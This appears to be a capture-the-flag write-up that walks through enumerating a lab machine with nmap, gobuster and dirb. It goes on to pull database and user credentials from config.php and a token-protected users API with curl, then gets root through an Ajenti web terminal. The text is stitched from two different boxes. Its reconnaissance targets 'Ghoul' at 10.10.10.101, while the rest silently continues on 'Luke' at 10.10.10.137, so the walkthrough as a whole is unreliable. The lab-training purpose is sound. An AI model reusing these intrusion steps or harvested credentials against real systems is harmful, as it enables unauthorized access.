I"U<h1 id="user">USER</h1>

<h2 id="reconnaissance">Reconnaissance</h2>

<h3 id="nmap">NMAP</h3>

<p>As usual we always start with <strong>Nmap</strong> scanning:</p>

<pre>root@pentestbox:~# nmap -sC -sV -oA ghoul 10.10.10.101

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A64A06AAE4304C2B3921E4FA5C9FF39C
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report

</pre>

<p>Due to the fact that there doesn’t seems to be nothing really interesting on the website on port 80 and that the one on port 8080 is protected from a basic authentication, I run gobuster on port 80.</p>

<pre> /root/go/bin/gobuster dir -u http://10.10.10.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o gobuster --timeout 30s

/index.html (Status: 200)
/images (Status: 301)
/blog.html (Status: 200)
/contact.html (Status: 200)
/archives (Status: 301)
/uploads (Status: 301)
/users (Status: 301)
/css (Status: 301)
/js (Status: 301)
/secret.php (Status: 200)
/less (Status: 301)
/server-status (Status: 403)
</pre>

<p>This reveals an interesting page, secret.php.
It shows a chat between system admins  talking about an RCE on the current infrastructure.</p>

<p><img src="/images/Ghoul/secret_1.png" alt="" /></p>

<p>Due to the fact that the enumeration didn’t show anything else interesting here I swapped port and went to port 8080. Tried <strong>admin:admin</strong> and it worked , showing a website for uploading images or zip on the server.</p>

<p><img src="/images/luke/port_3000_luke.png" alt="" /></p>

<h3 id="dirbuster">DirBuster</h3>

<p>With dirbuster and big.txt wordlist we found some interesting file such as:</p>

<pre>
File found: /config.php - 200
Dir found: /css/ - 200
File found: /css/bootstrap.min.css - 200
File found: /css/scrolling-nav.css - 200File found: /css/signin.css - 200
</pre>

<p>Where config.php retrieved us what it looks as db credentials:</p>

<pre>
$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword =
'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost,
$dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -&gt;
error);
</pre>

<p>But those credentials were incorrect for the login.php and /management login
which we found with dirb.
So we start to look at the js api service. We needed to retrieve the available api
so we used dirb again over this port:</p>

<pre>
 $dirb http://10.10.10.137:3000 -w /usr/share/wordlists/dirb/big.txt
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Fri Sep 20 00:37:31 2019
URL_BASE: http://10.10.10.137:3000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.137:3000/ ----
+ http://10.10.10.137:3000/login (CODE:200|SIZE:13)
+ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)
+ http://10.10.10.137:3000/users (CODE:200|SIZE:56)
-----------------
END_TIME: Fri Sep 20 00:40:28 2019
DOWNLOADED: 4612 - FOUND: 3
</pre>

<p>So we have a login api and users api.
Users api needs and authenticaton token probably supplied by the /login api.
So first we tried to login we the credentials found in the config.php file.</p>

<pre>
$ curl --header "Content-Type: application/json" \
&gt; --request POST \
&gt; --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' \
&gt; http://10.10.10.137:3000/login
{"success":true,"message":"Authentication
successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2Vybm
FtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTky
NzB9.NkXilej8x5JP2MOHRz3SDkgPs3AVz4YEmtg2s_H0siY"}
</pre>

<p><strong>Success!!</strong></p>

<p>The post requests give us the access token, which we can use to query the /users
api:</p>

<pre>
$ curl -X GET -H 'Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwi
aWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTkyNzB9.NkXilej8x5JP2
MOHRz3SDkgPs3AVz4YEmtg2s_H0siY' http://10.10.10.137:3000/users/
[{"ID":"1","name":"Admin","Role":"Superuser"},
{"ID":"2","name":"Derry","Role":"Web Admin"},
{"ID":"3","name":"Yuri","Role":"Beta Tester"},
{"ID":"4","name":"Dory","Role":"Supporter"}]
</pre>

<p><strong>Perfect!</strong> We have users now, let’s try to query one user at time:</p>

<pre>
$ curl -X GET \
&gt; -H 'Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwi
aWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTkyNzB9.NkXilej8x5JP2
MOHRz3SDkgPs3AVz4YEmtg2s_H0siY' \
&gt; http://10.10.10.137:3000/users/Dory
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
bet@tester87
{"name":"Admin","password":"WX5b7)&gt;/rp$U)FW"}
</pre>

<p>In fact we discovered after several tries that the Derry credentials were correct
for the /management panel
And this is what looks like the management panel; we just have some files
config.php login.php which we already had:</p>

<p><img src="/images/luke/after_login_luke.png" alt="" /></p>

<p>But now we alse have config.json file! Which looks really interesting since
seems to be something related to ajenti page, which is the login page discovered
on port 8000:
This is what login page looks like:</p>

<p><img src="/images/luke/ajenti_login_luke.png" alt="" /></p>

<p>And this is otherwise what the config.json file shows on /management page:</p>

<p><img src="/images/luke/json_luke.png" alt="" /></p>

<p>What is immediately visible is the password field;which seems to be the admin
password for ajenti login.</p>

<pre><b>password "KpMasng6S5EtTy9Z"</b></pre>

<p>So Username root and password KpMasng6S5EtTy9Z:</p>

<p><img src="/images/luke/logged_luke.png" alt="" /></p>

<p><strong>Logged in!!</strong></p>

<h1 id="root">ROOT</h1>

<p>This looks like Ajenti backend and after several google research we noticed that
there a “Terminal” options which it open a terminal with bash with the user
privileges, in our case guess what… root!!
So clicking on terminal and running a new one gave us a perfect shell with root
priv:</p>

<p><img src="/images/luke/rooted_luke.png" alt="" /></p>

<p>From here we can also of course create a reverse shell to our host machine but
the flag is already retrieved.</p>

<h4 id="thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-">Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)</h4>
:ET